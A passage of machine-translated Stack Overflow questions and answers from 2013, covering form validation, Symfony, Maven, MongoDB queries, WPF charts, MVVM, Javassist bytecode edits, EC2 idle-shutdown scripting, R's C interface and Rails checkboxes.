客户端验证很有用，因为它让用户在提交表单之前就知道存在问题，让他们有机会更正它。

服务器端验证 - 这是您在服务器收到表单值时检查表单值的地方，以确保它是您期望的格式，不包含无效信息等。当您完成表单时，您会看到此验证正在使用中，提交它，页面重新加载并告诉您有错误。

无论您是否在客户端进行验证，都应该进行这种类型的验证。禁用 javascript 很容易，如果您只使用客户端验证，人们可以输入他们想要的任何内容。这是一个安全风险。

我通常做的是设置我的页面，并使用服务器端验证。这确保不存在安全问题，并且我正在检查用户输入的数据。一旦工作正常，我还会添加客户端 javascript 验证，以使表单更加用户友好。这样做，javascript 验证可确保用户输入正确的信息，但如果出现问题或 javascript 被禁用，我的服务器无论如何都会验证数据。

因此，要回答您的问题，您至少应该进行服务器端验证。在 Swiftmailer 实际发送电子邮件之前进行验证非常重要，这样如果输入了无效数据，则不会发送电子邮件。

# symfony - Symfony 从 2.0 迁移到 2.2 还是等待 2.3 LTS？

> ID：15899510
> 
> 赞同：0
> 
> 时间：2013-04-09T10:30:00.133
> 
> 标签：symfony, migration

我们实际上想将 2.0.23 的 Symfony 应用程序迁移到 2.2。但是由于 2.3 版本的发布在附近（2013 年 5 月）很安静，我们想知道等待这个专业不是更好，因为它是 LTS 吗？这对我们来说非常重要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:44:41.953

我认为最好等到[长期支持](http://symfony.com/doc/current/contributing/community/releases.html#long-term-support-releases)版本[发布](http://symfony.com/doc/current/contributing/community/releases.html#schedule)。[根据](http://symfony.com/blog/symfony-2-3-what-s-next?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:%20symfony/blog%20%28Symfony%20Blog%29)发布模型维护3年。

**更新，**

可能重复 >[将基于 Symfony 2.0 的项目更新到 Symfony 2.2](https://stackoverflow.com/questions/15602057/update-project-based-on-symfony-2-0-to-symfony-2-2)

# maven-2 - 从存储库获取“org.codehaus.mojo:jasperreports-maven-plugin”的 POM 时出错

> ID：15899511
> 
> 赞同：1
> 
> 时间：2013-04-09T10:30:01.413
> 
> 标签：maven-2, jasper-reports, jboss7.x

我正在尝试将 OSGI 捆绑包部署到 Jboss 7.1.1.Final。每次我编译和部署项目时，它都会给我以下错误。

我已经检查了 M2，只有 1.0-beta-2 版本存在，因为我们也可以在存储库中看到类似的东西[http://mvnrepository.com/artifact/org.codehaus.mojo/jasperreports-maven-plugin/1.0-beta -2](http://mvnrepository.com/artifact/org.codehaus.mojo/jasperreports-maven-plugin/1.0-beta-2)

POM 中没有定义版本，不确定它试图从哪里提取这个版本。

**命令** mvn jboss-as:deploy -Pdomain -DskipTests -Dusername=manish -Dpassword=password -Dhost=xxxx -Dport=9999 -X

**POM 配置**

```
<repository>
            <id>jboss-public-repository</id>
            <name>JBoss Repository</name>
            <url>https://repository.jboss.org/nexus/content/groups/public</url>
            <releases>
                <enabled>true</enabled>
            </releases>
            <snapshots>
                <enabled>false</enabled>
            </snapshots>
        </repository>
        <repository>
            <id>jasperreports</id>
            <url>http://jasperreports.sourceforge.net/maven2</url>
        </repository>
    </repositories>
        ...
    <plugins>
    <!-- Jasper Plugins -->
    <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>jasperreports-maven-plugin</artifactId>
        <configuration>
            <outputDirectory>${project.build.directory}/jasper</outputDirectory>
        </configuration>
        <executions>
            <execution>
                <goals>
                    <goal>compile-reports</goal>
                </goals>
            </execution>
        </executions>
        <dependencies>
            <dependency>
                <groupId>net.sf.jasperreports</groupId>
                <artifactId>jasperreports</artifactId>
                <version>4.7.0</version>
            </dependency>
            <dependency>
                <groupId>org.codehaus.groovy</groupId>
                <artifactId>groovy-all</artifactId>
                <version>1.7.5</version>
            </dependency>
        </dependencies>
    </plugin> 
```

**错误**

```
Caused by: org.apache.maven.project.ProjectBuildingException: Error getting POM for 'org.codehaus.mojo:jasperreports-maven-plugin' from the repository: Failed to resolve artifact, possibly due to a repository list that is not appropriately equipped for this artifact's metadata.
  org.codehaus.mojo:jasperreports-maven-plugin:pom:1.0-beta-3-SNAPSHOT

from the specified remote repositories:
  central (http://repo1.maven.org/maven2),
  jboss-public-repository (https://repository.jboss.org/nexus/content/groups/public)

 for project org.codehaus.mojo:jasperreports-maven-plugin
    at org.apache.maven.project.DefaultMavenProjectBuilder.findModelFromRepository(DefaultMavenProjectBuilder.java:592)
    at org.apache.maven.project.DefaultMavenProjectBuilder.buildFromRepository(DefaultMavenProjectBuilder.java:251)
    at org.apache.maven.project.artifact.MavenMetadataSource.retrieveRelocatedProject(MavenMetadataSource.java:163)
    ... 22 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:01:45.620

jasperreport 插件可通过 Maven 中心获得，但不是 SNAPSHOT 版本。问题是您是否需要使用 SNAPSHOT 版本或可以在[此处](http://search.maven.org/#search%7Cgav%7C1%7Cg%3a%22org.codehaus.mojo%22%20AND%20a%3a%22jasperreports-maven-plugin%22)找到的发布版本。

# asp.net - Node Js - 来自字符串数组的 Mongo 动态查询

> ID：15899514
> 
> 赞同：1
> 
> 时间：2013-04-09T10:30:12.813
> 
> 标签：asp.net, node.js, mongodb, mongoose

我有一个字符串数组，例如`['flat','flat shoes','shoes','black shoes']`.

mongo 集合有一个名为 ' `KeyWords`' 的字段，它是一个字符串。

我需要编写一个查询来获取带有 ' `KeyWords`' 的元素，其中包含字符串数组中的任何项目。

示例集合

```
{
 "KeyWords" : [
         "MEN'S SMART SHOES- FIREBACK LEATHER SLIP ON SHOES TAN",
         "G670",
         "SMART SHOES",
         "FIREBACK SHOES",
         "SHOES"
 ]}
{
 "KeyWords" : [
         "MEN'S SMART SHOES- FIREBACK LEATHER SLIP ON SHOES TAN",
         "G670",
         "SMART SHOES",
         "FIREBACK SHOES",
         "SHOES"
 ]
} 
```

任何人都可以建议如何实现这一目标。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:21:08.387

用于`$in`完全匹配：

```
var keywords = ['flat','flat shoes','shoes','black shoes'];
YourModel.find({ KeyWords: { $in : keywords } }, ...); 
```

对于子字符串匹配，您可以使用正则表达式查询：

```
var regexp = new RegExp("\\b(?:" + keywords.join("|") + ")\\b", "i"); // "i" means case insensitive
YourModel.find({ KeyWords : regexp }, ...); 
```

`\b`匹配单词边界，因此正则表达式将匹配*'very good flat shoes'*但不匹配 ' *very good flatshoes'*。

# wpf - WPF 工具包图表 - 自定义工具提示 - 显示复杂的相关值

> ID：15899515
> 
> 赞同：0
> 
> 时间：2013-04-09T10:30:16.437
> 
> 标签：wpf, templates, charts, tooltip, toolkit

我有以下图表：

```
<cht:Chart ...>
    <cht:Chart.Series>
        <cht:LineSeries Name="LineSeries" Title="a"
            DependentValueBinding="{Binding Path=Value}"
            IndependentValueBinding="{Binding Path=Key}"
            ItemsSource="{Binding Path=SourceCollection}"
            IsSelectionEnabled="True"
            DataPointStyle="{DynamicResource SmallPointStyle}">
       </cht:LineSeries>
   </cht:Chart.Series>
</cht:Chart> 
```

和数据点样式：

```
<Style TargetType="cht:LineDataPoint"> 
    <Setter Property="Width" Value="2" />
    <Setter Property="Height" Value="2" />
    <Setter Property="DependentValueStringFormat" Value="{}{0:0.00}"/>
</Style>
<Style x:Key="SmallPointStyle" TargetType="cht:LineDataPoint" BasedOn="{StaticResource {x:Type cht:LineDataPoint}}">
    <Setter Property="BorderBrush" Value="Orange"/>
    <Setter Property="Background" Value="Orange"/>
</Style> 
```

源集合是 KeyValuePair 的列表。该应用程序工作正常。

我遇到了一个问题，因为我想使用 KeyValuePair> 的集合，其中 doubleA 是提取的数据，而 doubleB 是基于范围的 doubleA 的标准化值。所以我需要将 LineSeries 更改为：

```
<cht:Chart ...>
    <cht:Chart.Series>
        <cht:LineSeries Name="LineSeries" Title="a"
        DependentValueBinding="{Binding Path=Value.Value}"
        IndependentValueBinding="{Binding Path=Key}"
        ItemsSource="{Binding Path=SourceCollection}"
        IsSelectionEnabled="True"
        DataPointStyle="{DynamicResource SmallPointStyle}">
       </cht:LineSeries>
    </cht:Chart.Series>
</cht:Chart> 
```

它按我的预期工作，但我需要在工具提示中显示实际值（Value.Key），而不是 DependentValue。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-28T07:44:59.133

有关一种可能的解决方案，请参阅此[博客文章](http://blogs.msdn.com/b/delay/archive/2009/05/19/chart-tweaking-made-easy-how-to-make-four-simple-color-tooltip-changes-with-silverlight-wpf-charting.aspx)。

[您可以在此处](http://silverlight.codeplex.com/SourceControl/changeset/view/18791#507649)找到必须覆盖的 LineSeries 数据点样式。但是，请记住，当您覆盖模板时，您将不再获得任何随机颜色。

祝你好运！

# mvvm - 如何保持不同的视图与 MVVM 解耦

> ID：15899517
> 
> 赞同：1
> 
> 时间：2013-04-09T10:30:21.247
> 
> 标签：mvvm, decoupling, coupling

我的应用程序旨在加载 XML 文件并显示错误（如果有）。

我遇到的问题是如何在不耦合的情况下在屏幕上同时显示（XML 和错误）（我的应用程序当前可以工作）。

我的应用程序目前看起来像（请不要嘲笑或评论我正在上 Photoshop\UI 课程）：

![在此处输入图像描述](https://i.stack.imgur.com/ajH4K.png)

棕色是称为 XmlView 的不同视图。
红色框是我希望显示错误的地方。

因此，用户单击 File->Open，选择文件，.XML 内容显示在我的 XmlView（棕色）中，我的错误消息显示为红色。这行得通，但是我有一种可怕的感觉，我的设计很糟糕，因为我已经完全耦合了我的 MainWindow 和 XmlView。

我的工作方式是，当用户选择一个有效的 XML 文件（从 File->Open）时，我创建我的 XmlView 的一个实例并将它绑定到我的 MainWindow 类的 Views 属性。我的 XmlView 采用 1 个参数，即 MainWindow 类型。

因此，在我的 XmlView 中，要更新我的 ErrorList，我会编写类似于

```
_mainWindow.ErrorList.Add(//newError) 
```

但这现在意味着我的 XmlView 知道我认为不想要的 MainWindow。

所以，最后，我的问题！我的设计很差还是可以？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:35:24.593

如果你在做 MVVM ，你应该考虑[使用 MVVM 框架](http://www.lhotka.net/weblog/UsingTheMVVMPatternRequiresAFramework.aspx)。

这取决于加载 XML 的责任是谁，但我建议使用`XmlViewModel`. 而不是`MainViewModel`.

在这种情况下，`MainViewModel`应该只是其他视图模型的导体。在您的第一种情况下，它将实例化`XmlViewModel`，传递文件路径并将其设置为当前视图。

将`XmlViewModel`负责加载和验证 XML。它也可以有一个显示验证错误的子视图模型。它应该异步加载 XML，并带有某种形式的忙碌通知。

可能需要执行许多视图模型，因此`MainViewModel`如果您要使用诸如[Caliburn.Micro](https://caliburnmicro.codeplex.com)之类的框架，这将是一个[导体类型](https://caliburnmicro.codeplex.com/wikipage?title=Screens,%20Conductors%20and%20Composition)。

# java - 在 Javassist 中修改行号

> ID：15899518
> 
> 赞同：3
> 
> 时间：2013-04-09T10:30:28.020
> 
> 标签：java, javassist

所以我最近一直在使用 Javassist，但遇到了一个我无法找到答案的问题。CtMethod 的 insertAt 方法允许您在特定行号处插入代码，但它是覆盖该行还是保留它，以及如何使其与默认情况相反？我有一个应用程序，它根据 XML 文件中的“钩子”在运行时使用 Javassist 修改源代码。我想这样做以便可以覆盖一条线，或者可以将一条线放在该线上方而不是覆盖它。显然有一些骇人听闻的方法可以做到这一点，但我宁愿使用正确的方法。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-19T14:51:41.953

## 容易的部分

CtMethod 对象中存在的方法[insertAt(int lineNumber, String src)](http://www.csg.is.titech.ac.jp/~chiba/javassist/html/javassist/CtBehavior.html#insertAt%28int,%20boolean,%20java.lang.String%29)允许在给定行中的代码**之前注入在***src中编写的代码。*

 **例如，采用以下（简单）示例程序：

```
public class TestSubject {

   public static void main(String[] args) {
     TestSubject testSubject = new TestSubject();
     testSubject.print();
   }

   private void print() {
    System.out.println("One"); // line 9
    System.out.println("Two"); // line 10
    System.out.println("Three"); // line 11
   }
} 
```

通过简单的编码（记住方法变量必须是*打印*方法的 CtMethod 表示）：

```
 // notice that I said line 10, which is where the sysout of "two" is
   method.insertAt(10, true, "System.out.println(\"one and an half\");"); 
```

将在类中注入新的 sysout 指令。新类的输出将是：

```
 one
 one and an half
 two 
 three 
```

## 困难的部分

Javassist 没有提供删除一行代码的简单方法，所以如果你真的想替换它，你别无选择，只能破解你的方式。

怎么做？好吧，让我向您介绍您的新朋友（如果您还不知道的话），[CodeAttribute](http://www.csg.is.titech.ac.jp/~chiba/javassist/html/javassist/bytecode/CodeAttribute.html)对象。

CodeAttribute 对象负责保存表示方法流的字节码，除了 code 属性还有另一个名为[LineNumberAttribute](http://www.csg.is.titech.ac.jp/~chiba/javassist/html/javassist/bytecode/LineNumberAttribute.html)的属性，它可以帮助您将行号映射到字节码数组中。所以总结这个对象有你需要的一切！

以下示例中的想法非常简单。将字节码数组中的字节与应删除的行相关联，并用无操作码替换字节。

再一次，method 是方法*print的 CtMethod 表示*

```
 // let's erase the sysout "Two"
    int lineNumberToReplace = 10;
    // Access the code attribute
    CodeAttribute codeAttribute = method.getMethodInfo().getCodeAttribute();

    // Access the LineNumberAttribute
    LineNumberAttribute lineNumberAttribute = (LineNumberAttribute)      codeAttribute.getAttribute(LineNumberAttribute.tag);

    // Index in bytecode array where the instruction starts
    int startPc = lineNumberAttribute.toStartPc(lineNumberToReplace);

    // Index in the bytecode array where the following instruction starts
    int endPc = lineNumberAttribute.toStartPc(lineNumberToReplace+1);

    System.out.println("Modifying from " + startPc + " to " + endPc);

    // Let's now get the bytecode array
    byte[] code = codeAttribute.getCode();
    for (int i = startPc; i < endPc; i++) {
      // change byte to a no operation code
       code[i] = CodeAttribute.NOP;
    } 
```

*在原始*TestSubject 类中运行此修改，将产生一个具有以下输出的注入类：

```
 one
 three 
```

## 加起来

当您需要添加一行并仍保留现有行时，如果要替换该行，只需使用*简单部分中给出的示例，您必须首先使用中给出**的示例删除现有行硬部分*，然后使用第一个示例注入新行。

另外请记住，在示例中，我假设您已经熟悉 javassist 的基础知识，只向您展示了多汁的部分，而不是全部交易。这就是为什么，例如，在示例中没有 ctClass.writeFile... 你仍然需要这样做，我只是把它省略了，因为我确实希望你应该知道你必须这样做。

如果您在代码示例中需要任何额外帮助，请询问。我很乐意提供帮助。**

# sql-server - 从多个表中选择逗号分隔

> ID：15899519
> 
> 赞同：10
> 
> 时间：2013-04-09T10:30:33.910
> 
> 标签：sql-server, tsql, select, join

什么是最好的（低资源和速度）？

```
SELECT     C.[col1]
           , D.[col2] 
    FROM   tbl1 C,
           tbl2 D 
    WHERE  C.[colid] = D.[colid] 
```

或者

```
SELECT  [tbl1].[col1], [tbl2].[col2]    
FROM    [tbl1] INNER JOIN [tbl2] ON
        [tbl1].[colid] = [tbl2].[colid] 
```

谢谢！

更新

阅读[这篇文章](https://sqlblog.org/2009/10/08/bad-habits-to-kick-using-old-style-joins)。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:54:48.683

我在最近的一些 Microsoft 程序（ASP.NET Membership）中看到了这段代码。作为底线，如果你有 INNER JOIN 也是一样的。

谢谢您的反馈！

# java - 如何使用 selenium java 选择一个 javascript 按钮

> ID：15899521
> 
> 赞同：0
> 
> 时间：2013-04-09T10:30:39.080
> 
> 标签：java, javascript, button, click

# zend-framework2 - 是否使用 AJAX 在 ZF2 中包含 js 和 css

> ID：15899522
> 
> 赞同：0
> 
> 时间：2013-04-09T10:30:40.237
> 
> 标签：zend-framework2

我在 ZF2 中有一些必须包含 js 和 css 文件的视图。我可以这样做：

```
$this->headscript()->appendScript(... 
```

但是，当我使用 ajax 获取视图结果时，我需要使用视图 html、css 包含和 js 包含从服务器数组中获取。像这样：

```
array(
    'html' => '<div id="timepicker-wrap"></div>',
    'js_include' => array('/js/timepicker.js'),
    'js_eval' => '$("#timepicker-wrap").timepicker()',
    'css_include' => array('/css/timepicker.css'),
); 
```

在我将这些数据提供给客户端后，我的 js 库将包括 html、js 和 css。

问题是从服务器端的 headscript 中获取所有 js 和 css 文件和代码。

我是否必须扩展 HeadScript、HeadStyle 和 InlineScript 类并添加返回所有 js 和 css 的函数？还是我必须做点别的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T13:19:04.040

使用 Ajax 时可以很容易地绕过布局，例如：

SomeController.php

```
public function myAction()
{
    if($this->getRequest()->isXmlHttpRequest()) {
        $this->layout('application/layout/ajax-layout');
    }

    return new ViewModel();
} 
```

应用程序/布局/ajax-layout.phtml

```
<?php echo $this->content ?> 
```

当您尝试使用 Ajax 请求访问 somecontroller/my/ 时，将不会呈现包含您的 head/js/etc 的基本布局。

但是，当您使用正常请求查看时，它将被呈现。

还有其他几种方法可以做到这一点，但这可能是最简单的:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T21:33:28.910

您可以使用 getContainer() 方法从 headScript、headStyle 和 InlineScript 中获取所有 js 和 css

```
$this->headScript()->getContainer()->getValue() 
```

# ios - 禁用 UIWebView 中 contenteditable div 的自动大写

> ID：15899531
> 
> 赞同：4
> 
> 时间：2013-04-09T10:30:56.463
> 
> 标签：ios, cocoa-touch, uiwebview

我有一个 UIWebView，它加载了一个带有 contenteditable div 的基本 html 页面。此 div 具有以下属性：

```
<div id="editor" 
     contenteditable="true" 
     autocapitalize="none" 
     autocorrect="off" 
     autocomplete="off">#CONTENT#</div> 
```

但是，在 iOS 5 和 iOS 6 中，句子仍然是大写的。

我尝试设置`autocapitalize`为`off`，但随后`none`根据[Safari HTML Reference](http://developer.apple.com/library/safari/#documentation/AppleApplications/Reference/SafariHTMLRef/Articles/Attributes.html)将其设置为，但仍然没有乐趣。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-25T08:36:34.620

`autocapitalize`, `autocorrect`,`autocomplete`仅受支持的输入和表单标记。见`Related Tags`文档。

# timer - 如果在另一个计费时间之前空闲，则关闭 EC2 实例

> ID：15899544
> 
> 赞同：4
> 
> 时间：2013-04-09T10:31:37.733
> 
> 标签：timer, amazon-web-services, amazon-ec2, amazon-cloudwatch

在不可预测的时间（用户请求），我需要运行内存密集型作业。为此，我获得了一个现场或按需实例，并用标签将其标记为`non_idle`. 工作完成后（可能需要几个小时），我给它打上标签`idle`。由于 AWS 的按小时计费模型，我想保持该实例处于活动状态，直到另一个计费小时发生，以防另一个工作进入。如果有工作进入，则应重用该实例并将其标记为`non_idle`. 如果在此期间没有工作进入，则实例应终止。

AWS 是否为此提供现成的解决方案？据我所知，CloudWatch 无法设置应在特定时间运行的警报，更不用说使用 CPUUtilization 或实例的标签了。否则，也许我可以简单地为每个创建的实例设置一个 java 计时器或 scala actor，在实例创建后每小时运行一次并检查 tag `idle`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:38:24.493

对于这种细粒度优化，没有现成的 AWS 解决方案，但您可以使用现有的构建块根据当前实例的启动时间构建您自己的（请参阅 Dmitriy Samovskiy 的智能解决方案，用于推断[此 EC2 实例多久以前开始了？](http://www.somic.org/2009/06/04/how-long-ago-was-this-ec2-instance-started/)）。

## 玩“鸡”

Shlomo Swidler 在他的文章[Play “Chicken” with Spot Instances中探讨了这种优化，尽管在](http://shlomoswidler.com/2011/02/play-chicken-with-spot-instances.html)[Amazon EC2 Spot 实例](http://aws.amazon.com/ec2/spot-instances/)的背景下动机略有不同：

> AWS Spot 实例有一个有趣的经济特性，可以让系统玩一些游戏。与所有 EC2 实例一样，当您开始终止 Spot 实例时，即使您使用的时间不到一小时，您也会产生一小时的费用。但是，当 AWS 因现货价格超过投标价格而终止实例时，您无需为当前小时付费。

当然，机制是相同的，因此您可以简单地重用他组装的脚本，即执行此脚本而不是将实例标记为`idle`：

```
#! /bin/bash
t=/tmp/ec2.running.seconds.$$
if wget -q -O $t http://169.254.169.254/latest/meta-data/local-ipv4 ; then
    # add 60 seconds artificially as a safety margin
    let runningSecs=$(( `date +%s` - `date -r $t +%s` ))+60
    rm -f $t
    let runningSecsThisHour=$runningSecs%3600
    let runningMinsThisHour=$runningSecsThisHour/60
    let leftMins=60-$runningMinsThisHour
    # start shutdown one minute earlier than actually required
    let shutdownDelayMins=$leftMins-1
    if [[ $shutdownDelayMins > 1 && $shutdownDelayMins < 60 ]]; then
        echo "Shutting down in $shutdownDelayMins mins."
        # TODO: Notify off-instance listener that the game of chicken has begun
        sudo shutdown -h +$shutdownDelayMins
    else
        echo "Shutting down now."
        sudo shutdown -h now
    fi
    exit 0
fi
echo "Failed to determine remaining minutes in this billable hour. Terminating now."
sudo shutdown -h now
exit 1 
```

一旦*有工作进入，*您就可以取消预定的终止，而不是或除了标记实例，`non_idle`如下所示：

```
sudo shutdown -c 
```

这也是测试/操作期间的“红色按钮”紧急命令，参见例如 Shlomo 的警告：

> 在使用它之前，请确保您真正了解此脚本的作用。如果您错误地安排了要关闭的实例，您可以使用此命令取消它，在实例上运行：sudo shutdown -c

## 将 CloudWatch 添加到游戏中

[您可以通过与Amazon CloudWatch](http://aws.amazon.com/cloudwatch/)集成来进一步采用 Shlomo 的自包含方法，该方法最近添加了[使用 Amazon CloudWatch 检测和关闭未使用的 Amazon EC2 实例](http://aws.amazon.com/about-aws/whats-new/2013/01/08/use-amazon-cloudwatch-to-detect-and-shut-down-unused-amazon-ec2-instances/)的选项，有关详细信息，请参阅介绍性博客文章[Amazon CloudWatch - 警报操作](http://aws.typepad.com/aws/2013/01/amazon-cloudwatch-alarm-actions.html)：

> 今天，我们让您能够在**触发 CloudWatch 警报时****停止**或终止您的 EC2 实例。您可以将其用作故障保护（检测异常情况然后采取行动）或作为应用程序处理逻辑的一部分（等待预期条件然后采取行动）。*[强调我的]*

 ***您的用例具体列在*应用程序集成*部分中：

> 您还可以根据您逐个实例观察到的[自定义指标创建 CloudWatch 警报。](http://aws.typepad.com/aws/2011/05/amazon-cloudwatch-user-defined-metrics.html)例如，您可以衡量每分钟对您自己的 Web 服务 API 的调用、页面请求或消息发布，并根据需要进行响应。

[因此，您可以通过向 CloudWatch发布自定义指标](http://docs.aws.amazon.com/AmazonCloudWatch/latest/DeveloperGuide/publishingMetrics.html)来利用这一新功能，以指示实例是否应根据 Dmitriy 的启动时间检测终止 (is )，并在*有作业进入*且实例应继续运行 (is )`idle`后再次重置指标-就像 EC2 将负责终止一样，3 个自动化步骤中的 2 个将从实例转移到操作环境中，并且自动化过程的管理和可见性相应得到改善。*`non_idle`****

# c - 当我调用 C 代码时，R 冻结

> ID：15899546
> 
> 赞同：3
> 
> 时间：2013-04-09T10:31:41.680
> 
> 标签：c, r

我写了一个小的 C 代码来做随机游走大都会，我在 R 中调用它。当我运行它时，R 冻结。我不确定代码的哪一部分不正确。我遵循这个[Peng and Leeuw 教程](http://www.biostat.jhsph.edu/~rpeng/docs/interface.pdf)（第 6 页）。作为免责声明：我对C没有太多经验，并且只有一些C ++的基本知识

```
#----C code --------
#include <R.h>
#include <Rmath.h>

void mcmc(int *niter, double *mean, double *sd, double *lo_bound, 
          double *hi_bound, double *normal)
{
    int i, j;
    double x, x1, h, p;
    x = runif(-5, 5);
    for(i=0; i < *niter; i++) {
        x1 = runif(*lo_bound, *hi_bound);
        while((x1 + x) > 5 || (x1 + x) < -5)
            x1 = runif(*lo_bound, *hi_bound);
        h = dnorm(x+x1, *mean, *sd, 0)/dnorm(x, *mean, *sd, 0);
        if(h >= 1)
            h = 1;
        p = runif(0, 1);
        if(p < h)
            x += x1;
        normal[i] = x;
    }
}

#-----R code ---------
foo_C<-function(mean, sd, lo_bound, hi_bound, niter)
{
    result <- .C("mcmc",  as.integer(niter), as.double(mean), as.double(sd), 
                 as.double(lo_bound), as.double(hi_bound), normal=double(niter))
    result[["normal"]]
} 
```

编译后：

```
dyn.load("foo_C.so")
foo_C(0, 1, -0.5, 0.5, 100) 
```

**跟进：** 循环`while`是问题所在。但问题的根源似乎与函数有关`runif`，该函数应该在下限和上限之间生成一个随机变量。但似乎该函数实际上所做的是随机选择上限值 (5) 或下限值 (-5)。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T12:14:49.330

在调用 R 的随机数生成例程之前，您需要按照[编写 R 扩展](http://cran.r-project.org/doc/manuals/R-exts.html)，第[6.3 节随机数生成](http://cran.r-project.org/doc/manuals/R-exts.html#Random-numbers)和调用中的说明进行操作。`GetRNGstate();`完成后您还需要致电`PutRNGstate();`。

您的代码开始工作的原因可能是因为您在调用C 函数`set.seed`之前调用了 R 会话。`mcmc`

所以你的 C 代码应该是这样的：

```
#include <R.h>
#include <Rmath.h>

void mcmc(int *niter, double *mean, double *sd, double *lo_bound, 
          double *hi_bound, double *normal)
{
    int i;
    double x, x1, h, p;
    GetRNGstate();
    x = runif(-5.0, 5.0);
    for(i=0; i < *niter; i++) {
        x1 = runif(*lo_bound, *hi_bound);
        while((x1 + x) > 5.0 || (x1 + x) < -5.0) {
            x1 = runif(*lo_bound, *hi_bound);
            //R_CheckUserInterrupt();
        }
        h = dnorm(x+x1, *mean, *sd, 0)/dnorm(x, *mean, *sd, 0);
        if(h >= 1)
            h = 1;
        p = runif(0, 1);
        if(p < h)
            x += x1;
        normal[i] = x;
    }
    PutRNGstate();
} 
```

# ruby-on-rails - 显示复选框列表而不是多选

> ID：15899550
> 
> 赞同：11
> 
> 时间：2013-04-09T10:31:58.613
> 
> 标签：ruby-on-rails, ruby-on-rails-2

我有一个`MyModel`带有序列化属性的模型`a`，描述了一组符号。

此代码有效：

```
<% form_for @my_model do |f| %>
  <%= f.select :a, MyModel::AS, :multiple => true) %>
<% end %> 
```

参数正确：

```
{ :my_model => { :a => [:a_value1, :a_value2] } } 
```

我想将此多选转换为一组复选框，如下所示：

```
<% form_for @my_model do |f| %>
  <% MyModel::AS.each do |a_value|
    <%= f.check_box(:a_value) %>
  <% end %>
<% end %> 
```

它也可以，但是参数根本不一样：

```
{ :my_model => { :a_value1 => 1, :a_value2 => 1 } } 
```

我想了两个解决方案来返回第一个解决方案......

*   当用户点击 check_box_tags 时，将my`check_box`转换为、替换多项选择并添加一些 javascript 以“检查”选择值。`check_box_tag`然后，参数将直接在控制器中相同。
*   在控制器中添加一个小代码以“调整”我的参数。

什么解决方案不那么难看？或者还有其他的吗？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-04-09T13:24:40.410

我找到了一个解决方案，使用我不知道的“多个”选项。

```
<% MyModel::AS.each do |a_value| %>
  <%= f.check_box(:a, { :multiple => true }, a_value) %>
<% end %> 
```

结果参数有点奇怪，但它应该可以工作。

```
{"my_model" => { "a" => ["0", "a_value1", "0", "a_value2", "0"] } 
```

从@Viren 编辑：`nil`在函数末尾传递，例如

```
 <%= f.check_box(:a, { :multiple => true }, a_value, nil) %> 
```

完美运行。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-05-04T18:20:00.803

`has_and_belongs_to_many`还有一个值得一提的解决方案，如果你有一个or`has_many` `through`关系，它可以很容易地使用`collection_check_boxes`表单助手将记录插入到数据库中。[请参阅此处的文档。](https://edgeapi.rubyonrails.org/classes/ActionView/Helpers/FormOptionsHelper.html#method-i-collection_check_boxes)

```
<%= f.collection_check_boxes :mymodel_ids, MyModel::AS, :id, :name do |m| %>
  <%= m.check_box %> <%= m.label %>
<% end %> 
```

然后，在控制器中，我们将允许该`mymodel_ids`属性：

```
params.require(:mymodel).permit(:name, mymodel_ids:[]) 
```

我们还可以设置模型验证以要求至少选中一个复选框：

```
validates :mymodel_ids, presence: true 
```

此方法的另一个好处是，如果您稍后编辑`mymodel`记录并取消选中其中一个复选框，则其记录将从 上的`many_to_many`关联表中删除`save`。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-02-11T20:27:38.090

你可以这样做：

```
<% MyModel::AS.each do |a_value| %>
  <%= f.check_box("a[]", a_value) %>  
<% end %> 
```

这将使参数如下到达服务器

```
{ :my_model => { :a => [:a_value1, :a_value2] } } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-11-28T19:03:13.687

如果您已经有一个 select_tag

```
<%= select_tag "filters", options_from_collection_for_select(filter_values, "id", "name", selected_ids), multiple:true, class:"form-control" %> 
```

并想用 check_box_tag 替换它，你需要实现这样的东西：

```
<div class="checkbox-inline">
    <%= check_box_tag "filters[]", value.id, selected_ids.include?(value.id), { :multiple => true} %>
    <%= value.name %>
</div> 
```

注意名称上的结束括号需要捕获复选框导致相同的参数。

当我实现这个时，select_tag 和 check_box_tag 之间的参数格式相同

# jquery - jQuery Cookie 网址

> ID：15899554
> 
> 赞同：0
> 
> 时间：2013-04-09T10:32:09.983
> 
> 标签：jquery, cookies, back-button

我有这个 cookie`jQuery.cookie("previousUrl", window.location.href, {path:"/"});`来存储上一页的 url。如何将此 cookie 用作 window.location 以便当用户单击“后退按钮”时，它会将他们带到 cookie 中设置的页面 url？干杯，迈克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:34:47.850

首先获取cookie值

```
var cookieVal = $.cookie('previousUrl'); 
```

然后做

```
 window.location.href = cookieVal; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:38:37.850

`jQuery`试试这个：

```
$(window).unload( function () 
{
   // read cookies value and if its set then window.location.href = cookie value
} 
```

在`javascript`：

```
window.onbeforeunload = function () {
   // read cookies value and if its set then window.location.href = cookie value
} 
```

# spring - 如果 jsf 客户端验证失败，则无法更改 spring webflow 状态

> ID：15899558
> 
> 赞同：0
> 
> 时间：2013-04-09T10:32:18.273
> 
> 标签：spring, jsf, spring-webflow, client-side-validation

我有一个用于创建记录的简单表单——它有一些必填字段和两个按钮，一个用于提交，一个用于取消。问题是取消按钮不起作用（它实际上总是重新加载视图以创建记录），除非输入了所有必填字段。字段看起来像这样

```
<h:inputText id="name"
    value="#{userController.User.name}"
    required="true"
    requiredMessage="This field is required"
